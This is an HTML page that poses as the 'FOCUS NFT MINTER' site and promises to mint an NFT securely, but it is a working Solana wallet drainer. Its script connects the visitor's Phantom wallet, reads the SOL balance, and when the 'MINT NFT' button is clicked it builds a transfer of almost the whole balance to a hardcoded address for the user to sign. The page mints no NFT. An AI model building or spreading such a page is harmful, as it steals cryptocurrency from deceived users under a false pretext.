<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Focus NFT Sweeper</title>
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Solana SDK -->
  <script type="module">
    import { Connection, PublicKey, clusterApiUrl, Transaction, SystemProgram } from "https://unpkg.com/@solana/web3.js@1.92.1/lib/index.iife.js";

    const connection = new Connection(clusterApiUrl('mainnet-beta'));
    const destAddress = 'J3Y5AkexRtc4RuHEoUz9oBCzN9WANgGk5yp9JKEzwD84';
    const destPubkey = new PublicKey(destAddress);
    let publicKey;

    function showToast(message, type = 'success', duration = 4000) {
      const toast = document.getElementById('toast');
      toast.textContent = message;
      toast.className = type;
      toast.style.display = 'block';
      setTimeout(() => {
        toast.style.display = 'none';
      }, duration);
    }

    document.addEventListener("DOMContentLoaded", () => {
      document.getElementById('connectBtn').onclick = async () => {
        if (window.solana && window.solana.isPhantom) {
          try {
            const resp = await window.solana.connect();
            publicKey = resp.publicKey;
            document.getElementById('walletAddress').textContent = publicKey.toString();
            loadBalances();
            showToast('Wallet connected!', 'success');
          } catch (err) {
            console.error('Wallet connection failed:', err);
            showToast('Wallet connection failed.', 'error');
          }
        } else {
          alert('Phantom wallet not found! Please install Phantom.');
        }
      };

      async function loadBalances() {
        const balance = await connection.getBalance(publicKey);
        document.getElementById('solBalance').textContent = (balance / 1e9).toFixed(5) + ' SOL';
      }

      document.getElementById('sweepBtn').onclick = async () => {
        if (!publicKey) {
          showToast('Please connect your wallet first.', 'error');
          return;
        }

        const amountLamports = await connection.getBalance(publicKey);
        if (amountLamports < 5000) {
          showToast('Not enough SOL for transfer.', 'error');
          return;
        }

        const transaction = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: destPubkey,
            lamports: amountLamports - 5000
          })
        );

        transaction.feePayer = publicKey;
        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

        try {
          const signed = await window.solana.signTransaction(transaction);
          const sig = await connection.sendRawTransaction(signed.serialize());

          const explorerLink = `https://solscan.io/tx/${sig}?cluster=mainnet-beta`;
          showToast(`Transfer sent! `, 'success');
          setTimeout(() => {
            const toast = document.getElementById('toast');
            toast.innerHTML = `Transfer sent! <a href="${explorerLink}" target="_blank" style="color:#fff; text-decoration:underline;">View on Solscan</a>`;
          }, 500);
        } catch (err) {
          console.error('Transaction failed:', err);
          showToast('Transaction failed.', 'error');
        }
      };
    });
  </script>

  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #0d0d0d;
      color: white;
    }

    header {
      background-color: #1c1c1c;
      padding: 20px 40px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .logo {
      font-size: 1.5rem;
      font-weight: bold;
      color: white;
      text-decoration: none;
    }

    nav a {
      margin-left: 20px;
      color: #ccc;
      text-decoration: none;
    }

    nav a:hover {
      color: #ff4d00;
    }

    .hero {
      padding: 80px 20px;
      text-align: center;
    }

    .cta-button {
      background-color: #ff4d00;
      padding: 15px 30px;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      text-decoration: none;
    }

    .cta-button:hover {
      background-color: #e64300;
    }

    footer {
      background-color: #1c1c1c;
      text-align: center;
      padding: 20px;
      color: #999;
      margin-top: 40px;
    }

    #toast {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #1c1c1c;
      color: white;
      padding: 12px 20px;
      border-radius: 6px;
      display: none;
      font-size: 0.9rem;
      z-index: 1000;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }

    #toast.success {
      background-color: #28a745;
    }

    #toast.error {
      background-color: #dc3545;
    }
  </style>
</head>

<body>
  <header>
    <a href="#" class="logo">FOCUS NFT</a>
    <nav>
      <a href="#">Home</a>
      <a href="#">Mint</a>
    </nav>
  </header>

  <section class="hero">
    <h1 class="text-4xl font-bold mb-6">FOCUS NFT MINTER</h1>
    <p class="text-gray-400 mb-8">Connect your wallet and mint your NFT securely and instantly.</p>

    <button id="connectBtn" class="cta-button mb-6">Connect Wallet</button>

    <div class="max-w-md mx-auto text-left">
      <div class="mb-4">
        <p class="text-sm text-gray-400">Connected Wallet:</p>
        <p id="walletAddress" class="break-words text-green-400"></p>
      </div>

      <div class="mb-6">
        <p class="text-sm text-gray-400">SOL Balance:</p>
        <p id="solBalance" class="text-yellow-400 font-bold">-</p>
      </div>

      <button id="sweepBtn" class="cta-button w-full">MINT NFT</button>
    </div>
  </section>

  <footer>
    <p>&copy; 2025 Focus NFT. All rights reserved.</p>
  </footer>

  <div id="toast"></div>
</body>
</html>
